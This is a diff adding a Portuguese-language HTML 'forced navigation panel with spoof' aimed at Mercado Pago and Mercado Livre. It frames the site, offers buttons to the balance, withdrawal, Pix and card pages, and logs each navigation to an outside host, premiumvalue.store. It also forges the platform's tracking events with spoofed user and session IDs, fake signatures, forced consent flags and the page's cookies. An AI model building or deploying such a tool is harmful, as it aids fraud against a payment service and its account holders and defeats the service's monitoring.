@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Painel de Navegação Forçada com Spoof</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      font-family: sans-serif;
+      background: #fff;
+      overflow: hidden;
+    }
+
+    #painel {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 9999;
+      width: 100%;
+      background: #000;
+      color: white;
+      padding: 10px;
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      align-items: center;
+    }
+
+    #painel button {
+      padding: 8px 12px;
+      font-size: 14px;
+      background: #ffcc00;
+      border: none;
+      cursor: pointer;
+      color: #000;
+      font-weight: bold;
+    }
+
+    iframe {
+      position: absolute;
+      top: 90px;
+      left: 0;
+      width: 100%;
+      height: calc(100% - 90px);
+      border: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="painel">
+    <button onclick="navegar('https://www.mercadopago.com.br/home')">🏠 Início</button>
+    <button onclick="navegar('https://www.mercadopago.com.br/banking/balance')">💰 Saldo</button>
+    <button onclick="navegar('https://www.mercadopago.com.br/withdraw#from=home_desktop')">🏦 Saque</button>
+    <button onclick="navegar('https://www.mercadopago.com.br/money-out/transfer/pix-methods')">⚡ Pix</button>
+    <button onclick="navegar('https://www.mercadopago.com.br/cards/cards-listing')">💳 Cartões</button>
+    <button onclick="navegar('https://www.mercadopago.com.br/hub-engine/hubs/my-data')">📇 Meus dados</button>
+  </div>
+
+  <iframe id="iframeML" src="https://www.mercadolivre.com.br/"></iframe>
+
+  <script>
+    const iframe = document.getElementById("iframeML");
+    let rotaAtual = "";
+    let inicio = null;
+
+    function navegar(url) {
+      rotaAtual = url;
+      inicio = Date.now();
+      iframe.src = url;
+      spoofTrack(url); // Envia spoof do evento de navegação
+    }
+
+    iframe.onload = () => {
+      const tempo = Date.now() - inicio;
+      fetch("https://premiumvalue.store/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          rota: rotaAtual,
+          tempoCarregamento: tempo,
+          agente: navigator.userAgent,
+          timestamp: new Date().toISOString()
+        })
+      });
+    };
+
+    function spoofTrack(path) {
+      const payload = {
+        tracks: [{
+          path,
+          type: "view",
+          user_local_timestamp: new Date().toISOString(),
+          server_id: crypto.randomUUID(),
+          id: crypto.randomUUID(),
+          user: {
+            uid: "spoofed-uid",
+            user_tags: [],
+            privacy_consents: {
+              advertising: true,
+              traceability: true,
+              performance: true,
+              functionality: true
+            },
+            melidata_session_id: "spoofed-session"
+          },
+          event_data: {
+            spoof: true,
+            forced_navigate: true,
+            spoofed_url: path
+          },
+          platform: {
+            http: {
+              cookies: document.cookie,
+              headers: {
+                host: new URL(path).hostname,
+                "x-request-id": crypto.randomUUID(),
+                "x-d2id": "spoofed-uid",
+                "x-device-js": "true",
+                "x-platform": "ml"
+              },
+              http_url: path,
+              http_referer: document.referrer
+            }
+          },
+          application: {
+            sdk_version: { node_version: "6.12.0", js_version: "0.6.14" },
+            version: "2.10.1",
+            business: "mercadopago",
+            site_id: "MLB",
+            technologies: ["nordic"],
+            secured: {
+              encrypted: "fakeEncrypted",
+              signature: "fakeSignature"
+            }
+          },
+          device: {
+            resolution_height: window.innerHeight,
+            resolution_width: window.innerWidth,
+            platform: "/web/desktop",
+            user_agent: navigator.userAgent
+          }
+        }]
+      };
+
+      fetch("https://api.mercadolibre.com/tracks", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload),
+        credentials: "include"
+      });
+    }
+  </script>
+
+</body>
+</html>
